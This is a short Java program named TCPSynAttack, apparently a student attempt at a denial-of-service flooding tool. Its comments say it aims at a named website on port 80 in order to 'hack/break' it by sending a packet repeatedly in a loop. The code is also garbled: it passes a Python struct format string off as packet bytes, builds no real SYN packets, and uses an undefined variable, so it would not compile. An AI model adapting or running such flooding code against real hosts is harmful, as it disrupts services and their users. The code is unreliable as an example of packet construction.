import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.lang.Exception;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.net.Socket;
import java.util.*;

public class TCPSynAttack {

	public static void main(String[] args)
	{
		/* Declaring all variables that are going to get send via a packet
		to send a packet with different types of variables we need to convert everything into bytes*/
		String characters = "!BBHHHBBH4s4s";
		byte[] charactersBytes = characters.getBytes(); //converting the string called characters into bytes
		int ip_ihl = 5;
		int ip_ver = 4;
		int ip_tos = 0;
		int ip_tot_len = 0;
		int ip_id = 54321;
		int ip_frag_off = 0;
		int ip_ttl = 255;
		int ip_proto = 6;
		int ip_check = 0;
		String source_ip = "10.1.12.66"; 
		String destination_ip = "10.1.12.173";
		byte[] source_ipBytes = source_ip.getBytes(); //converting source ip into bytes
		byte[] destination_ipBytes = destination_ip.getBytes(); //converting destination ip into bytes

		int ip_ihl_ver = (ip_ver << 4) + ip_ihl;

		Socket socket = null; //initialize a socket

		try{
			//creating a socket with the host of "frechetta.me" which is the website we are trying to hack/break
			//80 is the port number for websites
			socket = new Socket("frechetta.me", 80); 	
		} catch(Exception e){
			System.out.println("Connection FAILED!!! Failed to open connection to a socket.");
      			System.exit(0); //if it fails the program ends
		}
		System.out.println("Success");
		
		//We create a byteBuffer object which is going to be use to load everything into bytes
		//but first we allocate enought space for it
		ByteBuffer buf = ByteBuffer.allocate(1024);

		//were push everything into the byteBuffer that is going to get send as a packet
		buf.put(charactersBytes);
		buf.putInt(ip_ihl_ver);
		buf.putInt(ip_tos);
		buf.putInt(ip_tot_len);
		buf.putInt(ip_id);
		buf.putInt(ip_frag_off);
		buf.putInt(ip_ttl);
		buf.putInt(ip_proto);
		buf.putInt(ip_check);
		buf.put(source_ipBytes);
		buf.put(destination_ipBytes);
		
		int size = buf.remaining();
		//we create an array of type byte to transfer everything from the byteBuffer to the byte array
		byte[] arr = new byte[buf.remaining()];  
		buf.get(arr);//everything in buf(byteBuffer) gets transfer to the array
		
		System.out.println("Size: " + size);

		long startTime = System.currentTimeMillis();
		System.out.println("startTime: " + startTime);

		int sent = 0;
		
		//we loop multiple times to send the packet(multiple times) to the website and try to break it.
		while(true){
			long endTime = System.currentTimeMillis();
			if(endTime - startTime < 60){
				try(DataOutputStream sendToServer = new DataOutputStream(socket.getOutputStream()))
		        {
		        	while(timeToExit != false) {
				//we send the packet as an array to the website/server
		        	sendToServer.write(arr, 0, size);
		        	sent++;
		        	System.out.println("Packt got sent");
		        }
		        }
		        catch(IOException ex)
		        {
		            System.out.println("Cannot send packet");
		            System.exit(0);
		        }
		    }
		    else{
		    	System.exit(0);
		    }
		}
	}



}
